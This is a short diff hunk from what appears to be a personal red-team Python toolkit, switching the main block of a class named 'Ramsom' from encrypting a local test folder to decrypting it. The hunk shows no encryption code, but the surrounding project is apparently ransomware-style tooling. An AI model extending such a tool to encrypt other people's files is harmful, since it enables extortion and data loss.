@@ -53,7 +53,7 @@ class Ramsom:
 if __name__=="__main__":
     #Key_gen()
     r=Ramsom("/home/miky/Desktop/RedPyMultytool/TargetFolder","filekey.key")
-    r.crypt()
-    #r.decrypt()
+    #r.crypt()
+    r.decrypt()
     #cryptfolder("/home/miky/Desktop/RedPyMultytool/TargetFolder",k)
     #decryptfolder("/home/miky/Desktop/RedPyMultytool/TargetFolder",k)
